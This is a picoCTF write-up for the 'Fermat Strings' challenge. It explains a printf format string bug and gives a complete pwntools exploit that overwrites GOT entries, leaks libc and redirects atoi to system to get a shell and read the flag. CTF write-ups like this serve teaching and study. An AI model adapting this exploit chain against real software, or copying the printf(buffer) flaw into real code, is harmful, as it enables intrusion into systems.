# FERMAT STRINGS

- This challenge is available at picoCTF. The challenge gives us 3 files
  + Binary challenge file `chall`.
  + Source file of challenge `chall.c`.
  + And `Dockerfile` of challenge that describe how path the machine are.

## OVERVIEW & IDEA

- First, I check the protection of binary file, and its infomations. We can see that, the file has no PIE, so we can take advantage of some address of functions that contain in binary file.

![img](/picoCTF/fermat-strings/assets/checksec.png)

```
λ ~/picoCTF/fermat-string/ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=964ca3b1c1c143aa765fc3c0aa4552bb6ec4cb08, not stripped
```

- Then, I check source file, and we can easily see that the format string vulnerable.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <math.h>

#define SIZE 0x100

int main(void)
{
  char A[SIZE];
  char B[SIZE];

  int a = 0;
  int b = 0;

  puts("Welcome to Fermat\\'s Last Theorem as a service");

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  printf("A: ");
  read(0, A, SIZE);
  printf("B: ");
  read(0, B, SIZE);

  A[strcspn(A, "\n")] = 0;
  B[strcspn(B, "\n")] = 0;

  a = atoi(A);
  b = atoi(B);

  if(a == 0 || b == 0) {
    puts("Error: could not parse numbers!");
    return 1;
  }

  char buffer[SIZE];
  snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B);
  printf(buffer);        // Format string vuln

  int answer = -1;
  for(int i = 0; i < 100; i++) {
    if(pow(a, 3) + pow(b, 3) == pow(i, 3)) {
      answer = i;
    }
  }

  if(answer != -1) printf("Found the answer: %d\n", answer);
}
```

- With this program, I will use format string vuln to change `pow@GOT.plt` (the program has Partial RELRO, so it's possible) to address start of main. It will be a loop that we can use `read()` and `printf(buffer)` many times for many payloads.

- To print the flag, I will overwrite `atoi@GOT.plt` address to `system()` in libc. So we can input the bash command to `A` or `B`, then `atoi(A)` will be `system(A)`, the same with `B`.

- Because of the program is dynamically linked and we don't know what libc version that program use, so we must leak address of some functions to find the libc version, with libc version, we have all offset of all functions, which will help us to calculate the `system()`'s address.

- As plan, we have 3 TURN
  + TURN 1: create loop and leak libc address (find libc's version with another script)
  + TURN 2: overwrite the `atoi@GOT.plt` to `system()`
  + TURN 3: get shell with our input

## DETAILS

### TURN 1

- With our plan that we discuss above. First, I check the address of `pow@GOT.plt`, and address of main, I think it does not have much difference because of pow has no calling before `printf(buffer)`. And it does. We just overwrite last 2 bytes of `pow@GOT.plt`.

![img](/picoCTF/fermat-strings/assets/pow_got_plt.png)

![img](/picoCTF/fermat-strings/assets/main_address.png)

- Note that we insert `A` and `B` to `buffer` as string, it terminate before `NULL` byte `\x00`. Therefore, with each variable `A` or `B`, we only insert one format specifiers and one address into it because of address of 64-bits have `NULL` byte when we present in little-edian.

- And another thing we must notice is `if (A == 0 || B == 0)`, we can bypass it by put number in front of each strings input.

> len("Calculating for A: ") = 19

> and i will use 1 as number for bypassing `atoi if` so we will minus 1 from total byte

- To overwrite address of `pow@GOT.plt` to `main` with `A`, We will print `0x0837 - (number of character printed before %s) - (number of byte use for atoi bypass) - (number of padding bytes)`. So It's `0x0837 - 19 - 1 - (padding)`


- Consider the stack before `printf(buffer)` we can see that start of `A` is aligned. So we must ensure the index of starting 8 bytes address we inject to stack is `muliple of 8 - 1`.


![img](/picoCTF/fermat-strings/assets/stack_1.png)


- Suppose the payload for `A` is:

```python
#0x837 = 2103, So %c will have more 4 bytes
#index of argument in start will be 7 - 99 so it will take 3 more bytes from %hn (include $)

A = "1%xxxxc[padding]%xx$hn[8_bytes_for_address]"
#x is for placeholder
```

- We consider from start to before 8 bytes address, except padding, number of bytes we are using is `13`, so we the 8 byte address will be at index `15`. The padding bytes will be `16 - 13 = 3 bytes`, and bytes to print is `0x0837 - 19 - 1 - 3 = 2080`.

- Index of argument will be calculate by add 6 (adding 6 because of in 64-bit asm, first 6 argument will be hold in register, and since 7th argument, it will be hold in stack) to number stack from top of stack to stack before of 8 bytes aligned stack that have argument. We will write 16 bytes from address `0x7fffffffde70`, then stack that is aligned has argument is address is `0x7fffffffde70 + 0x10 = 0x7fffffffde80`. So the index of `%hn` argument is `(0x7fffffffde80 - 0x7fffffffde50)/8 + 6 = 12`. In this challenge this formula is work well, but, I am not sure it's correct 100% in all system. So you can use `%llx` if there's a bug.

- And we got the payload we put in `A`

```python
A = "1%2080caaa%12$hn" + p64(pow@GOT.plt)
```

- I will use `B` for leaking address of `atoi@GOT.plt` that is address of `atoi()` in libc. With formula that I show above, and the start of `B` in stack, I can easily create the payload for `B`

![img](/picoCTF/fermat-strings/assets/stack_2.png)

```python
B = "1%43$s$!" + p64(atoi@GOT.plt)
```

- `$!` after `%43$s` is for delimit purpose when we read bytes that is sent from server.

### TURN 2

- Before we overwrite the `atoi@GOT.plt`, we must know that this address are written because of the program is dynamically linked, this address hold the address of atoi in libc with ALSR. So I must find address of least 2 function in this program to specify what libc that this program use.

- By this script, it will print the address of 2 function `atoi` and `read`.

```python
#! /usr/bin/python2
# filename: leaking.py
from pwn import *

p = remote("mars.picoctf.net", 31929)

address_atoi = 0x601058
address_read = 0x601050

A = "1" + "%11$s" + "$!" + p64(address_atoi) 
B = "1" + "%43$s" + "$!" + p64(address_read)

p.recvuntil("A: ")
p.sendline(A)
p.recvuntil("B: ")
p.sendline(B)

p.recvuntil("A: 1")
s_1 = p.recvuntil(b"$!")
s_1 = s_1[:-2]

p.recvuntil("B: 1")
s_2 = p.recvuntil(b"$!")
s_2 = s_2[:-2]

r_1 = 0
r_2 = 0

for i in range(len(s_1)-1, -1, -1):
    r_1 += (ord(s_1[i]) << 8*i)

for i in range(len(s_2)-1, -1, -1):
    r_2 += (ord(s_2[i]) << 8*i)

log.info(str(hex(r_1)))
log.info(str(hex(r_2)))

p.interactive()
```
- And we got

![img](/picoCTF/fermat-strings/assets/leak_address.png)

- I use [libc.blukat.me](https://libc.blukat.me/) to look up the libc version, and we got the offset of `atoi` and `system`.

![img](/picoCTF/fermat-strings/assets/libc_version.png)

- Turn 2 will create new stack frame of main, so `A` and `B` new does not hold old data. With the same formula that i show in TURN 1, I create payload for `A` and `B` to overwrite `atoi@GOT.plt`.

```python
# prepare for payload A ----------------------------------------------------------------
overwrite_2 = byte_2 - 1 - 19            # calculate the number of character for %c to overwrite byte 2nd
x = 6 - len(str(overwrite_2))            # calculate padding
overwrite_2 -= x                         # fit the overwrite and padding

# send A --------------------------------------------------------------------------------
p.recvuntil("A: ")                       
A = "1" + "%"+ str(overwrite_2).encode('ascii') + "c" + "a"*x + "%12$hhn" + p64(atoi_got_plt_addr+2)
p.sendline(A)                             

# prepare for payload B ----------------------------------------------------------------
overwrite_01 = byte_01 - 3 - byte_2 - 8 - 1  # minus 3 for address of atoi+2, 
                                             # byte_2 because we printed it before, 
                                             # 8 for " and B: ", 1 for "1" in front of %c
x_1 = 7 - len(str(overwrite_01))             # calculate padding
overwrite_01 -= x_1                          # fit the overwrite and padding

# send B --------------------------------------------------------------------------------
p.recvuntil("B: ")
B = "1" + "%{}c".format(overwrite_01) + "a"*x_1 + "%44$hn" + p64(atoi_got_plt_addr)
p.sendline(B)
```

### TURN 3

- When TURN 2 is done, TURN 3 is pretty easy, we just input the bash command and shell will respone us.

- In `Dockerfile` we can see that flag.txt is in current folder that have binary file

```
COPY bin/flag.txt /srv/app/flag.txt
COPY bin/chall /srv/app/run
```
- So I put one bash command `cat ./flag.txt` and `/bin/sh` to get shell.

```
# TURN 3 ---------------------------------------------------------------------------------------------------------

p.sendline("cat ./flag.txt")
p.sendline("/bin/sh")
```

- I will put whole exploit file in EXPLOIT section, may be you want to read it.

## EXPLOIT

```python
#! /usr/bin/python2

from pwn import *

# address of start loop  0x0000000000400837
# address of pow_got_plt 0x0000000000400716

p = remote("mars.picoctf.net", 31929)

main_addr = 0x400837
pow_got_plt_addr = 0x601040
atoi_got_plt_addr = 0x601058

# offset in libc
offset_system = 0x055410
offset_atoi =   0x047730

# TURN 1--------------------------------------------------------------------------------------------------------
A = "1"
B = "1"
A += "%2080c" + "a"*3 + "%12$hn" + p64(pow_got_plt_addr)
B += "%43$s" + "$!" + p64(atoi_got_plt_addr)

# send A ------------------------------------------------------------------------------
p.recvuntil(": ")
p.sendline(A)
 
# send B -----------------------------------------------------------------------------
p.recvuntil(": ")
p.sendline(B)

# read address of atoi libc ----------------------------------------------------------

p.recvuntil("B: ")   # remove all bytes before

s = p.recvuntil("$!")  # take the byte we want
s = s[:-2]             # remove delimiter

libc_atoi_leak = 0                            # decode the byte we take to get address
for i in range(len(s) - 1, 0, -1):            #    
    libc_atoi_leak += (ord(s[i]) << 8*(i-1))  #   

libc_address = libc_atoi_leak - offset_atoi   # calculate the base address of libc

address_sys = libc_address + offset_system    # calculate the system()'s address

log.info(str(hex(libc_atoi_leak)))            # debug purpose
log.info(str(hex(address_sys)))               #

byte_01 = (address_sys & 0xffff)              #   byte 0 and byte 1st
byte_2  = (address_sys >> 16) & 0xff          #   byte 2nd

log.info(str(hex(byte_01)) + " " + str(hex(byte_2)))   # debug purpose

# TURN 2-------------------------------------------------------------------------------------------------------- 

# prepare for payload A ----------------------------------------------------------------
overwrite_2 = byte_2 - 1 - 19            # calculate the number of character for %c to overwrite byte 2nd
x = 6 - len(str(overwrite_2))            # calculate padding
overwrite_2 -= x                         # fit the overwrite and padding

# send A --------------------------------------------------------------------------------
p.recvuntil("A: ")                       
A = "1" + "%"+ str(overwrite_2).encode('ascii') + "c" + "a"*x + "%12$hhn" + p64(atoi_got_plt_addr+2)
p.sendline(A)                             

# prepare for payload B ----------------------------------------------------------------
overwrite_01 = byte_01 - 3 - byte_2 - 8 - 1  # minus 3 for address of atoi+2, 
                                             # byte_2 because we printed it before, 
                                             # 8 for " and B: ", 1 for "1" in front of %c
x_1 = 7 - len(str(overwrite_01))             # calculate padding
overwrite_01 -= x_1                          # fit the overwrite and padding

# send B --------------------------------------------------------------------------------
p.recvuntil("B: ")
B = "1" + "%{}c".format(overwrite_01) + "a"*x_1 + "%44$hn" + p64(atoi_got_plt_addr)
p.sendline(B)

# TURN 3 ---------------------------------------------------------------------------------------------------------

p.sendline("cat ./flag.txt")
p.sendline("/bin/sh")

p.interactive()
```

## RESULT

![img](/picoCTF/fermat-strings/assets/result.png)